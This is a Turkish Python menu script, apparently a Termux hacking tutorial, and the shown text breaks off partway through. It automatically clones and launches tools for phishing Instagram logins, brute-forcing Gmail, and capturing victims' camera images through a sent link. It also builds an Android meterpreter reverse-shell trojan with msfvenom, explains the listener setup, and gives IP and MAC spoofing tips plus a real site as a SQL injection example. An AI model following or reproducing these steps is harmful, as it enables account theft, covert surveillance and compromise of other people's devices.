#!usr/bin/env python3
#-*- coding:utf-8 -*-

import os


os.system("clear")

print("""
\033[94m
\033[1m
 _____                                _____      _ _   _           
|_   _|__ _ __ _ __ ___  _   ___  __ | ____|__ _(_) |_(_)_ __ ___  
  | |/ _ \ '__| '_ ` _ \| | | \ \/ / |  _| / _` | | __| | '_ ` _ \ 
  | |  __/ |  | | | | | | |_| |>  <  | |__| (_| | | |_| | | | | | |
  |_|\___|_|  |_| |_| |_|\__,_/_/\_\ |_____\__, |_|\__|_|_| |_| |_|
                                           |___/                   
\033[1m
\033[92m
Eğitime Hoşgeldiniz

1)Termux Nedir                          2)Admin Panelleri Nasıl Bulunur

3)Tooları Nasıl indireceğiz             4)Trojan Nasıl Oluşturulur

5)Trojan Nasıl Dinlemeye Alınır         6)Nmap Nedir Nasıl Kullanılır

7)Gmail Hesaplarını Hackleme            8)İnstagram Hackleme Ve Mantıkları

9)Siteler Hakkında Bilgi Edinme         10)Sitelerde Açık Arama

11)Kamera Hackleme                      12)Gizli Hesapları İnceleme

13)Yazılımcı Olmak İsteyenler           14)İnternet Hakkında

15)Kulanıcı Adından Hesap Bulma         16)DDos Nedir?

17)Nasıl DDoS Atılır                    18)Ekstra Bilgi Ve Döküman

19)Parola Listesi Oluşturma		20)Kişiye Özel Parola Listesi Oluşturma

21)Bilgilendirme Ve Teşekkür

q)Çıkış

""")

ilk = input("Öğrenmek İstediğinizi Seçin: ")

if ilk=="1":
	os.system("clear")
	print("""\033[1m
\033[92m
Termux Android Telefonlardan Kendini hack Konusunda
Geliştirmek İsteyenler İçin Tasarlanmış Bir Debian
Tabanlı Telefon Uygulaması (IOS Desteklemez)
Termux İçinde Paket Yükleyicisi Sayesinde Birçok Şeyi
Kendi İçinde Kurabilir Bu Depolar "pkg ,apt ,apt-get" Şeklindedir 
Bir Paket Yüklemek İsterseniz "pkg install paket-adı"
Şeklinde Yüklersiniz. Sizin Linux'da Yapacağınız İşlerin
5/4'ünü Yapabilir Bu Yüzden Bilgisayarı Olmayan
Hacker Olamaz Diye Birşey Yoktur. Akıllı Telefonu Olan
Herkes Hacker Olabilir.

""")
	don = input("Ana Menüye Dönmek İstermisiniz[E/h]: ")
	if don=="e" or don=="E":
		os.system("python3 TEğitim.py")
	elif don=="h" or don=="H":
		exit()
elif ilk=="2":
	os.system("clear")
	print("""\033[1m
\033[92m
Öncelikle Admin Panel Nedir?
Admin Adından Anlaşılacağı Gibi
Admin Yetkisi Olanların Giriş Yapabileceği
Giriş Sistemidir. Giriş Sisteminde Bulunabilecek Açıklar
Genel Olarak SQL Ve Brute Force Olarak Karşımıza Çıkarlar.
İsterseniz Nasıl Admin Panel Bulunur Görelim

""")
	dev = input("Devam Edilsin mi? [E/h] ")
	if dev=="e" or dev=="E":
		print("Önce Kullanıcağımız aracı indirelim")
		os.system("sleep 3")
		os.system("pkg install git")
		os.chdir("/data/data/com.termux/files/home")
		os.system("git clone https://github.com/saepsh/saepapf")
		print("Şuan Gerekli Dosya İndirildi ")
		os.system("sleep 3")
		print("Kullanılan Komutları Eğitim İçinde Bulabilirsiniz.\nLütfen Onlarıda İnceleyin")
		os.chdir("/data/data/com.termux/files/home/saepapf")
		os.system("chmod 777 *")
		os.system("python2 saepapf.py")
	elif dev=="h" or dev=="H":
		exit()
	



elif ilk=="3":
	os.system("clear")
	print("Toolar Zaten Otomatik Olarak Bu Eğitimde Kuruluyor Ama Ben Size Manuel Nasıl Yükleyeceğinizi Burada Detaylı Bir Şekilde Anlatacağım")
	print("""\033[1m
\033[92m
Şimdi toolları en çok github.com adresinden indireceğiz buradan tooları indirmek için
önce git aracını kuruyoruz bunun için "pkg install git" yazabilirsiniz
git aracını kullanabilmek için "git clone <toolun linki>"

yani "git clone https://github.com/M49R0/MACRO.git" Şeklinde yazıcaksınız.
Sonra indirilen dosyanın içine girmek için "cd" komutunu kullanıyoruz
örneğin "cd MACRO" bu komutla eğer dosya orada ise dosyanın içine girecektir.

eğer dosyadan çıkmak ve ana dizine gizmek istiyorsanız sadece "cd" yazın.

Yok ben bir dizin aşağı gidicem diyorsanız o zaman "cd .." yazın.

Bir dosyanın içinde ne var görmek istiyorsanız "ls" yazın.

Bir Python dosyasını açmak için pythonun yüklü olması lazım
mesela "python örnek.py" ama bazen bazı python dosyaları
farklı oluyor. Mesela python3 python2 ilede açılan dosyalar var.

Shell ile yazılmış bir dosyayı ise "bash örnek.sh" şeklinde açabilirsiniz

""")
	don = input("Ana Menüye Dönmek İstermisiniz[E/h]: ")
	if don=="e" or don=="E":
		os.system("python3 TEğitim.py")
	elif don=="h" or don=="H":
		exit()
elif ilk=="4":
	os.system("clear")
	print("""\033[1m\033[92m
Trojan Nedir?

Truva atı olarakda bilinen bu virüs çok zararlıdır.
En başta kötü bir niyetle yapılmamıştı.
Ama sonradan kötüye kullanılmaya Başladı
saldırganın herşeyi ele geçirebilme olasıığı %95'dir

Trojanı Nasıl oluştururum

Bunun için metasploit denen bir araca ihtiyacımız var
metasploit iki bölümden oluşuyor msfvenom ve msfconsole
msfvenom ile trojan hazırlanıyor
msfconsole ile trojanımızı dinleyip yönetiyoruz

Tafsilat:

Trojanlardan korunmak için bilmediğiniz uygulamaları
hemen indirip açmayın. İndirirseniz bile virüs taraması yapmadan açmayın

Şimdi Esas Konumuza Gelelim

""")
	dev = input("Devam Edilsin mi [E/h] ")
	if dev=="e" or dev=="E":
		os.system("clear")
		print("""\033[1m\033[92m
Şimdi Metasploit manual olarak kurulması gereken bir araç
Biz onu şimdi otomatik olarak kuracağız ama siz manual olarak kurulmasını
dökümanlar arasnda bulabilirsiniz.
""")
		os.system("sleep 5")
		os.chdir("/data/data/com.termux/files/home")
		os.system("pkg install wget")
		os.system("pkg install curl")
		os.system("wget https://raw.githubusercontent.com/gushmazuko/metasploit_in_termux/master/metasploit.sh")
		os.system("chmod 777 *")
		os.system("./metasploit.sh")
		os.chdir("/data/data/com.termux/files/home/metasploit-framework")
		os.system("chmod 777 *")
		print("""\033[1m\033[92m
Msfvenomu kullanmak için payloadları bilmeniz gerekir
payloadları öğrenmek için "./msfvenom --list-payload" yazın
bütün payloadları gösterecektir.
Ama ben sadece windows için olan payloadları görmek istiyorum döyorsanız
bu payloadları msfconsole'dan "search windows" yazarak windows için olan
payloanları görebilirsiniz mesela şimdi android için bir virüs hazırlayalım
""")
		don = input("Devam Edilsin mi[E/h] ")
		if don=="e" or don=="E":
			os.system("clear")
			ip = input("Local IP Adresinizi Girin (ifconfig yazınca çıkması lazım): ")
			os.system("msfvenom -p android/meterpreter/reverse_tcp LHOST=" + ip + "LPORT=4163 -O trojan.apk")
			print("""\033[1m\033[92m
Trojanımız 4163 portunu kullanıyor sadece kendi ağınızda kullanabilirsiniz.
sizin modeminize bağlı olmayan bir kişi bu bu trojanı açsa bile siz onu hackleyemezsiniz
ilerde nasıl trojanı dinleyeceğimizi gösteriyorum şimdilik bu kadar.
""")
			don = input("Ana Menüye Dönmek İstermisiniz[E/h]: ")
			if don=="e" or don=="E":
					os.system("python3 TEğitim.py")
			elif don=="h" or don=="H":
					exit()

		elif don=="h" or don=="H":
			exit()
elif ilk=="5":
	print("""\033[1m\033[92m
Bir Trojanı dinlemeye almak için önce msfconsole yazıp enter tuşuna
basıyoruz açıldıktan sonra "use exploit/multi/handler" yazıyoruz
bundan sonrada "set payload" yazıp payloadımızın adını yazıyoruz

önceki derste payloadımız "android/meterpreter/reverse_tcp" şeklindeydi
payloadımızı eklemek için "set" yazıyoruz set seçmek anlamına gelir
"set payload" yazarak payload seçeceğimizi belirtiyoruz.
Yani yazmamız gereken "set payload android/meterpreter/reverse_tcp" yazmak.
sonra "show options" yazıyoruz. Bunu yazarak payload için ayar yapacağız

sonrada "set LHOST <Kendi IP Adresiniz>" yani "set LHOST 192.168.1.32" gibi
sonrada "set LPORT 4163" yazın

Tafsilat: LHOST Nedir?
LHOST virüsü açan bir kişiden bağlantı geldiğinde bağlantıyı
hangi IP adresine göndereceğini belirtmek için kullanılır

LPORT Nedir?
LPORT Bağlantıyı hangi portlar üzerinden saldırgana göndereceğini
belirtmek için kullanılır
""")
	don = input("Ana Menüye Dönmek İstermisiniz[E/h]: ")
	if don=="e" or don=="E":
			os.system("python3 TEğitim.py")
	elif don=="h" or don=="H":
			exit()

elif ilk=="6":
	os.system("clear")
	print("""\033[1m\033[92m
Nmap Nedir?

Nmap çok gelişmiş bir bilgi toplama aracıdır.
çok ayrıntılı bir araçtır kullanılması biraz zordur

Nmap Nasıl Kullanılır?
Benim github hesabıma bakarsanız nmap pratik kullanım aracı var
nasıl kullanıldığınıda gösteriyorum isterseniz kullanımına geçelim
""")
	dev = input("Devam Edilsin mi [E/h] ")
	if dev=="E" or dev=="e":
		print("\nönce nmap aracını yükleyelim")
		os.system("sleep 3")
		os.system("pkg install nmap")
		print("\033[1m\033[92m\nnmap'i yüklemek için 'pkg install nmap' yazabilirsiniz şuan nmap yüklendi")
		os.system("sleep 4")
		print("\n\n'nmap google.com' şeklinde bir arama yazarsanız klasik bilgileri verir")
		dev = input("\n\nDevam Edilsin mi [E/h] ")
		if dev=="E" or dev=="e":
			print("\033[1m\033[92m\n\n-sV parametresini kullanırsanız yani 'nmap -sV google.com' şeklinde yaparsanız portları\nve servis sürüm bilgilerini verir. Servis sürüm bilgileri çok önemlidir ileride anlıyacaksınız")
			deva = input("Devam Edilsin mi [E/h] ")
			if deva=="E" or deva=="e":
				os.system("sleep 1")
				print("\033[1m\033[92mnmap hedefe sorgu paket göndererek bilgi toplar ama bu paketlerde sizin IP adresiniz gözükür IP adresinizi gizlemek için\n-D yazarak sahte bir IP adresi yazarsanız IP adresinizi gizlersiniz.\nYani -->  nmap google.com -D 51.87.23.45")
				dev = input("\n\nDevam Edilsin mi [E/h] ")
				if deva=="E" or deva=="e":
					os.system("clear")
					print("\033[1m\033[92mSorgu paketleri atarken mac adreslerimizde gözükür\n\nMAC ADRES NERDİR?\n\nMac adres donanımların fiziksel adresleridir yani neredeyse tam konumunuzdur\n\nMac adresimizi nasıl gizleriz \n\nnmap --spoof-mac 00:0B:DB:82:58:C3 Şeklinde bir sorgu yaparsanız mav adresiniz gözükmez.\nYani sahte mac adresi gözükür sahte mac adresi ile sizi bulamazlar")
					print("\033[1m\033[92mDaha Fazla Ayrıntı için Nmap Pratik Kullanım Aracımı İnceleyebilirsiniz Bu Eğitim dökümanları arasında bulabilirsiniz")
					an = input("Ana Menüye Dönmek İstermisiniz [E/h]  ")
					if an=="e" or an=="E":
							os.system("python3 TEğitim.py")

				elif deva=="h" or deva=="H":
					os.system("sleep 0")
					quit()

			elif deva=="h" or deva=="H":
				os.system("sleep 0")
				quit()

		elif dev=="h" or dev=="H":
			quit()
elif ilk=="7":
	os.system("clear")
	print("""\033[1m\033[92mÖncelikle Gmail Hesabına ne yaparsak hesabı ele geçiririz?
Hesaba Oltalama Saldırısı Yapılabilir 
Brute Force Attack (Kaba Kuvvet Saldırısı) Yapılabilir

Oltalama Nedir?

Sosyal mühendislik olarakda geçen bu saldırı
kişiye bir link gönderilerek kişiyi kandırma odaklı bir saldırıdır

Brute Force Attack Nedir?

Bir Parola Listesi Oluşturarak hedef Giriş Sistemine Parola Deneme Saldırısı
Yapma Saldırısıdır Nasıl Parola Listesi Oluşturabileceğinizi Bu Kursda Görebilirsiniz

Not: Bu Dersi İşlemeden Önce Bir Parola Listesi Oluşturun
""")

	dev = input("Devam Edilsin mi [E/h] ")
	if dev=="e" or dev=="E":
		os.system("clear")
		print("Şimdi Gerekli Şeyler dosyalar Yükleniyor")
		os.system("sleep 2")
		os.system("pkg install git")
		os.system("apt update")
		os.system("pkg install python")
		os.system("termux-setup-storage")
		print("Kullanıcağımız Araç Hunner")
		os.system("sleep 1")
		os.chdir("/sdcard")
		os.system("git clone https://github.com/b3-v3r/Hunner")
		print("Programı Telefonun Kendisine Yükledik termuxu tekrar\naçtığınızda cd /sdcard yazarak ulaşabilirsiniz")
		os.system("sleep 3")
		print("""\033[1m\033[92m
Gmail ve Hotmail Brute Force Videosu Var
Burada Eğer Yazı İle Anlatsam 1 Sayfalık Yazı Çıkar
Gökümanlar arasında Videoyu Bulabilirsiniz

Not: Bu Dersi İzlemeden Önce Bir Parola Listesi Oluşturun
""")

elif ilk=="8":
	os.system("clear")
	print("""\033[1m\033[92m
İnstagram Hesapları Nasıl Hacklenir?

Not: Bu Anlatacaklarım Bir Sanalcıdan Alıntıdır
İnstagram Hesabı Çalmak Sizi Hacker Yapmaz Ve İllegal Bir Yoldur
Buradan Öğrendikleriniz Ve Uyguladıklarınızdan Ben Sorumlu Değilim

Not: Devam etmeden önce cihazınızdan Hostpot (mobil erisim noktası) ayarını aktifleştirin.
""")

	dev = input("Devam Edilsin mi [E/h] ")
	if dev=="e" or dev=="E":
		os.system("clear")
		print("""\033[1m\033[92m
1.Hack Yolu

Sosyal Mühendislik

En Etkili Yollardan Birisidir.
Kişiyi kandırarak ona birşey yaptırırsınız ve kişi bunun farkına varmaz
farkına varsa bile çok geç olucaktır 
""")
		dev = input("Devam Edilsin mi [E/h] ")
		if dev=="e" or dev=="E":
			print("""\033[1m\033[92m
Sosyal Mühendislik Saldırısı Nasıl Yapılır?

Bunun için gerekli araçlar var aracı indirip kurduktan sonra araç ile bir link oluşturulur. 
Bu link açıldığında kişinin IP adresi gözükür sayfa instagram sayfası gibidir oraya giriş yaparsınız
ve bilgiler saldırganın eline geçer.

Evet bu bir sosyal mühendislik. Başka  sosyal mühendislik saldırılarıda var onları dökümanlardan bulabilirsiniz
""")
			dev = input("Devam Edilsin mi [E/h] ")
			if dev=="e" or dev=="E":
				print("Dilerseniz gerekli aracı indirmeye başıyalım")
				os.system("sleep 2")
				os.chdir("/data/data/com.termux/files/home")
				os.system("git clone https://github.com/htr-tech/nexphisher.git")
				os.chdir("/data/data/com.termux/files/home/nexphisher")
				os.system("chmod 777 *")
				os.system("./tmux_setup")
				print("Kurulum Tamamlandı...")
				os.system("sleep 3")
				print("""\033[1m\033[92m
Aracı çalıştırmak için önce ana dizine cd komutu ile gidin.
Ardından cd nexphisher komutu ile dizine geçiş yapın.
Sonra ./nexphisher komutu ile aracı çalıştırıp instagram yazanı seçin
Daha Sonra ngrok yazanı tuşlayın ve bekleyin
Önünüze "lkdsfjslklkdfjsd.io" gibi bir link çıkıcaktır saçma sapan gelebilir
o linki kurbana gönderin bilgileri girdiğinde sizede gelecektir

Ayrıntılı Bilgilye Dökümanlardan Ulaşabilirsiniz
""")

				dev = input("Devam Edilsin mi [E/h] ")
				if dev=="e" or dev=="E":
					print("""\033[1m\033[92m
2. Hack Yolu

Brute Force Attack Saldırısı Nasıl Yapılır?

Brute Force Attack Saldırısının Mantığı Nedir?

Bir parola listesi oluşturarak programlar yardımı ile bu doğru şifre bulunana kadar
denemesidir. Bu saldırıyı yapmak için bir araca ve bir parola listesi lazımdır
ama bu zamanlarda doğru şekilde saldırı yapan bir araç yok.
büyük bir kısmı kendini güncellemiyor bu yüzden saldırılar başarısız oluyor.
Ama nasıl bu saldırının yapılacağını dökümanlarda gösteriyorum
""")

					dev = input("Devam Edilsin mi [E/h] ")
					if dev=="e" or dev=="E":
						print("""\033[1m\033[92m
3. Hack Yolu

Methodlar

Bu aslıda bir hackleme değildir. Bunlar biraz sosyal mühendislik
ve biraz açıklardan yararlanma olarak nitelendirilebilir

Methodları Dökümanlar arasında bulabilirsiniz.
""")
			elif dev=="h" or dev=="H":
				quit()
	elif dev=="h" or dev=="H":
		quit()

elif ilk=="9":
	os.system("clear")
	print("""\033[1m\033[92m
Siteler hakkında bilgi toplama 2 çeşide ayrılır.

1.Aktif Bilgi Toplama
2.Pasif Bilgi Tolama

Aktif Bilgi Toplama Nedir?
Aktif bilgi toplama bir sunucudan veya bir siteden sizin hareketleriniz izlenerek gizli dosyalara erişmeye çalışmaktır

Pasif Bilgi Toplama Nedir?
Pasif bilgi toplama halka açık olan bilgilerden yararlanmaktır.

Hangisi Daha iyi
Aktif bilgi toplama ne kadar riskli olsada fazla  bilgi verir 
bu yüzden pasif bilgi toplama pek tercih edilmez
ama aktif bilgi toplamada  IP adresiniz ve mac adresleriniz gözükür
konumunuz bilinir aktif bilgi toplarken VPN açmaya dikkat edin 
ve yasalara uyun


Pasif Bilgi Toplama Araçları

Whois
Shodan
TheHarvester
Traceroute
vs


Aktif Bilgi Toplama Araçları

nmap
owasp-zap
maltego
nslookup
vs

""")
	dev = input("Devam Edilsin mi [E/h] ")
	if dev=="E" or dev=="e":
		print("""\033[1m\033[92m
1)Whois		2)TheHarvester

3)Traceroute	4)nmap

5)owasp-zap	6)maltego
""")
		sec = input("Seçim Yapınız: ")
		if sec=="1":
			print("""\033[1m\033[92m
Whois Nasıl Kullanılır?

Öncelikle Whois Nasıl İndirilir

"apt install whois" yazarak kurabilirsiniz

whois aracını çalıştırmak için "whois sahibinden.com" şeklinde arama yapabilirsiniz.
Daha fazla ayrıntı için dökümanlara göz atabilirsiniz
""")

			don=input("Ana Menüye Dönmek İstermisiniz [E/h]  ")
			if don=="E" or don=="e":
					os.system("python3 TEğitim.py")

		elif sec=="2":
			print("""\033[1m\033[92m
TheHarvester Nasıl Kullanılır?

Dökümanlarda Bununla ilgili Bir Link Var Orada Herşey Gösteriliyor
""")
			don=input("Ana Menüye Dönmek İstermisiniz [E/h]  ")
			if don=="E" or don=="e":
					os.system("python3 TEğitim.py")


		elif sec=="3":
			print("""\033[1m\033[92m
TraceRoute Nedir? 

Traceroute Bir paketin hangi IP adresleri üzerinden hedefe gittiğini görmek için kullanılan bir araçtır.
Bir sorgupaketi gönderildiğinde ne tür gecikme oluyor nereden hangi IP adresleri hedef ile bağlantılı olduğunu gösteriyor.
Hedefte bir güvenlik duvarı varsa * * * şeklinde boş kalır yani bir güvenlik yazılımı olduğu anlaşılır.

TraceRoute Nasıl İndirilir?

Termuxda "pkg install tracepath" yazarak kurabilirsiniz. 

Kullanımı "traceroute google.com" şeklindedir
""")
			don=input("Ana Menüye Dönmek İstermisiniz [E/h]  ")
			if don=="E" or don=="e":
					os.system("python3 TEğitim.py")


		elif sec=="4":
			print("""\033[1m\033[92m
Nmap Aracının Kullanımı 6. dersde gösteriliyor
nmap pratik kullanım aracınıda kullanabilirsiniz
""")
			don=input("Ana Menüye Dönmek İstermisiniz [E/h]  ")
			if don=="E" or don=="e":
					os.system("python3 TEğitim.py")


		elif sec=="5":
			print("""\033[1m\033[92m
owasp-zap aracı termuxda çalışmıyor ama dökümanlarda owasp
aracının kullanımını  görebilirsiniz
""")
			don=input("Ana Menüye Dönmek İstermisiniz [E/h]  ")
			if don=="E" or don=="e":
				os.system("python3 TEğitim.py")

		elif sec=="6":
			print("""\033[1m\033[92m
maltego aracı termuxda çalışmıyor ama dökümanlarda maltego
aracının kullanımını gösteren linkler olacaktır
""")
			don=input("Ana Menüye Dönmek İstermisiniz [E/h]  ")
			if don=="E" or don=="e":
					os.system("python3 TEğitim.py")
elif ilk=="10":
	os.system("clear")
	print("""\033[1m\033[92m
Web Sitelerinde Ne Tür Açıklar Bulunur

XSS, SQL ENJEKSİYON, İFRAME, GET PUT AND DELETE,
BRUTE FORCE, PHP ENJEKSİYON, HTML ENJEKSİYON VE
BACKDOORLAR

Aslında Daha Fazla Açık Var Ama Bunlar En Bilinenler.

İsterseniz Bazılarına Göz Atalım
""")

	dev = input("Devam Edilsin mi [E/h] ")
	if dev=="E" or dev=="e":
		print("""\033[1m\033[92m
Xss Nedir?

XSS (Cross Site Scripting) script kodları üzerinden
(genelde javascript) bir web sayfasına saldırı yapılmasıdır.
Bu Saldırının 3'e ayrılır

1 Reflected XSS
2 Stored XSS
3 DOM Tabanlı XSS

Yukarıda Zararsızdan Zararlıya Doğru Sıraladık.
Xss Hakkında Daha Fazla Bilgi İçin Dökümanlara Göz Atabilirsiniz.
""")


		dev = input("Devam Edilsin mi [E/h] ")
		if dev=="E" or dev=="e":
			os.system("clear")
			print("""\033[1m\033[92m
SQL Enjeksiyonu Nedir?

Sql Enjeksiyonu veri tabanı açıklarından kaynaklı bir açık türüdür.
Veri tabanının Bazı Karakterleri Engellemediğinden Dolayı Bazı Hatalar Oluşur.
Bu hatalar sebebi ile bilgi sızdırılabilir

Sql Zaafiyetlerini Bulmak İçin Sqlmap Aracını Kullanabilirsiniz
(Saep Hack-Tool Aracında Kurulumu Otomatik Olarak Yapıyor)

Bu Zaafiyetlerin Nasıl İstismar Edileceği Hakkında Bilgi İçin Dökümanlara Göz Atabilirsiniz.

Not: Sql Zaafiyeti Bulmak İçin Azda Olsa Sql Dili Bilmeniz Gerekir
Örneğin: SELECT, INSERT, UPDATE, DELETE, ALTER, DROP, CREATE, USE, SHOW
Yukarudaki Kodlar Sql Dilinden Bazı Kodlardı Bunları Kullanmayı Bilirseniz Zaafiyetleri İstismar Edebilirsiniz

Sql Zaafiyeti Uygulamak İçin Linkin Örnekteki Gibi Olması Gerekir
Örnek: https://www.delhijainschool.com/gallery.php?id=15

Bu Eğitimde Web Zaafiyetleri Bu Kadardı Bir Sönraki Eğitimde Daha Ayrıntılı
Bir Şekilde Web Syber Security Derslerine Devam Edeceğiz.
""")

elif ilk=="11":
	os.system("clear")
	print("""\033[1m\033[92m
Kamera Nasıl Hacklenir.

Hangi Kamera Olursa Olsun Bir Link Üzerinde Kameraya Erişim Sağlanabilir.
Bu Yüzden Kameralar Kullanılmadığı Sürece Kapatılmalıdır Ben Şahsen Kapatmıyorum
(Çünkü Bilgisayarımın Kamerası Yok \U0001f600)
""")
	dev = input("Devam Edilsin mi [E/h] ")
	if dev=="E" or dev=="e":
		os.system("clear")
		print("Önce Gereken Aracı İndirelim")
		os.system("sleep 2")
		os.chdir("/data/data/com.termux/files/home")
		os.system("clear")
		os.system("git clone https://github.com/noob-hackers/grabcam.git")
		os.chdir("/data/data/com.termux/files/home/grabcam")
		os.system("chmod 777 *")
		os.system("clear")
		print("""\033[1m\033[92m
Şuan Aracımız Kuruldu Bu yazıdan Sonra "cd" yazıp ana dizine gidin sonra "cd grabcam" yazıpdosyaya gidin
ve "./grabcam.sh" yazarak programı çalıştırın ve ngrok olanı seçin (2. seçenek olması lazım)
Sonra Linki Kurbanınınza Gönderin Tıklartıklamaz resim çekicektır""")

elif ilk=="12":
	print("""\033[1m\033[92m
Her ne kadar bunlar pek önemli olmasada bazen önemsiyoruz ama bunları yapmanızı pek önermem
zaten bununla ilgili pek çok bilgi var ama size ödev olarak bunu araştırın 
bir hacker adayında olması gereken en önemli şey azmi olmasıdır. Azmi olmayan lamerlikten başka
birşey yapamaz.

Ödevinizi Unutmayın
""")

elif ilk=="13":
	os.system("clear")
	print("""\033[1m\033[92m
Evet Yazılımcı Olmak İsteyenler Çökün Bakayım.

Yazılım ile ilgili sektörleri 4'e Ayırabiliriz
En Bilinen Sektörler Aşağıdadır

1)Oyun Sektörü
2)Web Geliştirme Sektörü
3)Mobil Uygulama Sektörü
4)Yapay Zeka

Şimdi Sırayla İnceleyelim
""")
	dev = input("Seçim Yapınız: ")
	if dev=="1":
		os.system("clear")
		print("""\033[1m\033[92m
Oyun Sektörüde Aslında İkiye Ayrılır Ama Biz Şimdi
Bilgisayarlar İçin Oyun Sektörüne Göz Atacağız.

Hangi Yazılım Dillerini Bilmeniz Gerekir.

C# Veya C++
Ama İsterseniz Başka Bir Dilde Öğrenebilirsiniz Size Tavsiyem
Yazılımcı Olucaksanız Bu iki Dilden Birini Mutlaka Öğrenin.

Ne İle Yapılıyor Bu Oyunlar Hangi Uygulamalar Kullanılıyor

Unity Gibi Oyun Motorları Kullanılarak Yapılıyor
Bu oyun motorları sayesinde oyun yapmak çok daha kolay oluyor.

Oyun Yapmak Sadece Kodlardan İbaretmi ?

Tabikide Hayır. Bu Sektöre Bir Kere Girmeye Çalıştım Ama Bilgisayarım
Beni Yarı Yolda Bırakmasından Korktuğum İçin Giremesdim 

Bu Sektöre Giriyorsanız Youtubeden Baka Baka Öğrenmeniz Zor Olur
Udemy.com adresinden Oyun Geliştirme Kursları almanızı Tavsiye Ederim
(Filitrelerden Ücretsizi Seçebilirsiniz \U0001f600)
""")

		don=input("Ana Menüye Dönmek İstermisiniz [E/h]  ")
		if don=="E" or don=="e":
			os.system("python3 TEğitim.py")

	elif dev=="2":
		os.system("clear")
		print("""\033[1m\033[92m
Hangi Dilleri Bilmeliyiz

HTML Bilmeniz Şart
Python, SQL, MYSQL, Php, CSS ve Java Bu Dillerde Kullanılır
Bir Web Geliştirici Olamk İstiyorsanız Veri Tabanlarını Bilmeniz Gerekir

Veri Tabanı Dilleri İse

SQL, SQLite, MYSQL vs. Bu Şekilde Gider

Bu Sektörde Gelişmek İstiyorsanız udemy.com'da Bir Sürü Ders Var Onlardan Alabilirsiniz.
""")

		don=input("Ana Menüye Dönmek İstermisiniz [E/h]  ")
		if don=="E" or don=="e":
			os.system("python3 TEğitim.py")


	elif dev=="3":
		os.system("clear")
		print("""\033[1m\033[92m
Mobil Uygulama Geliştirmek İçin Hangi Dilleri Bilmemiz Gerekir.



Eğer Android Uygulama Geliştirmek İstiyorsanız Kotlin Şart. Nasıl Yazılıyor Unuttum ?

Ama Ben İOS Uygılaması Yapıcam Diyorsanız Swift Dili Şarttır

Bir Kere Bir Bilgisayarınızın Olması Şart
Hangi Dili Yazmak İsyorsunuz Hangi Sektörde Olduğunuz Fark Etmez.

Bu Sektörlerin Hiçbirine Girmedim Sayılır Ayrıntılı Bilgiyi Dökümanlarda Bulabilirsiniz
""")

		don=input("Ana Menüye Dönmek İstermisiniz [E/h]  ")
		if don=="E" or don=="e":
			os.system("python3 TEğitim.py")

	elif dev=="4":
		os.system("clear")
		print("""\033[1m\033[92m
Çok Popüler Olan Bu Sektör

Ama Bu Alanla İlgili Bildiğim Birşey Varsa Yapay Zekalar 
Kendini Geliştirebiliyor.
Size Bir Tavsiye Eğer Yapay Zeka İşine Gireceğim Diyorsanız Bilişim Derslerini Dinleyin Derim.

Bu Sektör İle İlgili Bildiğim Pek Birşey Yok Onun İçin Fazlada Söyleyeceğim Birşey Yok
""")
		don=input("Ana Menüye Dönmek İstermisiniz [E/h]  ")
		if don=="E" or don=="e":
			os.system("python3 TEğitim.py")

elif ilk=="14":
	os.system("clear")
	print("""\033[1m\033[92m
İnternet Dediğimiz Zaman Aklımıza OSI Modeli Gelmesi Lazım
Peki Nedir Bu OSI Modeli?

osi modeli 7 layer'dan (katmandan) oluşur. Bu Katmanları Sıralıyalım.

Open System Interconnection

Physical       ->    Data cabel etc.
Data           ->    Switch, MAC Address
Network        ->    Route, IP Addresss
Transport      ->    TCP, UDP etc.
Session        ->    Communication
Presentation   ->    Jpeg, Mov, Data
Application    ->    HTTP, Mail Server etc.

Resimli Halini Dökümanlarda Bulabilirsiniz.

""")
	dev = input("Devam Edilsin mi [E/h] ")
	if dev=="E" or dev=="e":
		os.system("clear")
		print("""\033[1m\033[92m
Katman 1

İnternetin  Fiziksel Tarafıdır

Katman 2

Verinin İşlendiği Bölüm
Switch Ne İşe Yarar

Kendi Ağı İçindeki Mac Adreslerini Kullanarak İletişim Sağlar 

Katman 3

IP Adresi Bu Katmanda İşlenir Modemde Burada İş Görüyor

Katman 4 

Transport Adından Anlışlıcağı Üzere portlar Bu Kısımda İş Görüyor.
Dış Bağlantı Buradan Salnıyor Veri Alışverişi Yapılıyor.

Katman 5

Session Açma İşlemi Dediğimiz İşlem Burada Yapılıyor
Bağlantı ve İletişim İşlemlerinin Yapıldığı Katman

Katman 6

Verinin Görselleştirilmesi Bu Katmanda Yapılıyor
JPEG MOV DATA Gibi Şeylerin Bu Katmanda İşlediğini Söyleyebiliriz.


Katman 7

Uygulama Katmanı Olarak Geçer Mail Serverleri HTTP Gibi Serverler
Bu Katmanda İşliyor Her zaman Duyduğunuz Bu Site HTTP Bu Site HTTPS Kullanıyor
Gibi Terimlerin Ana Kaynağıdır Aslında
""")

		ana = input("Ana Menüye Dönmek İstermisiniz [E/h] ")
		if ana=="e" or ana=="E":
			os.system("python3 TEğitim.py")
		elif ana=="h" or ana=="H":
        		exit()

elif ilk=="15":
	os.system("clear")
	print("""\033[1m\033[92m
Bir Kullanıcı Adının Hangi Sitelerde Kullanıldığını Görmek Ne İşe Yarar?

Devam

Kişiye Saldırılarda Lazım Olan Bir Bilgi

""")
	

	don = input("Ana Menüye Dönmek İstermisiniz [E/h]  ")
	if don=="E" or don=="e":
		os.system("python3 TEğitim.py")
	elif don=="h" or don=="H":
        	exit()

elif ilk=="16":
	os.system("clear")
	print("""\033[1m\033[92m
DDOS Nedir 

DDoS yani Distributed Denial of Service (Dağıtık Hizmet Engelleme) saldırıları, tamamen Bilgi Güvenliği unsurlarından 
Erişilebilirliği hedef almaktadır. Öncesinde sadece DoS (Denial of Service), yani tek bir kaynaktan hedefe doğru saldırı 
yapılması şeklinde ortaya çıkan bu saldırı türü, zamanla şiddetinin arttırılması için çok sayıda kaynaktan tek hedefe yapılan 
saldırı şekline dönüşmüştür

Bu Yaman Efkarın DDOS Hakkındaki anlatımı

DDOS Bir servisin bir bilgisayar veya bir dijital makine üzerinden paketler göndererek
hedefin devre dışı bırakılmasını sağlayan bir siber saldırıdır. DDOS'un Tanımı
Denial of Service (Dağıtık Hizmet Engelleme) gibidir(Yukarıdakini kopyaladım)
bu DDOS saldırıları kendi içinde çok dallara ayrılır 
örneğin: SYN flood, ACK flood, ICMP flood gibi

	(TAFSİLAT BÖLÜMÜ)
Bu gibi saldırılar yapmak için hedefte bir portun açık olması lazımdır
eğer bir ip bulup buna ben hemen ddos atarım diyorsanız yanılıyorsunuz
web sitelerinde zaten port açmak zorundalar ama istediğiniz portu yazamazsınız
""")

elif ilk=="17":
	os.system("clear")
	print("""\033[1m\033[92m
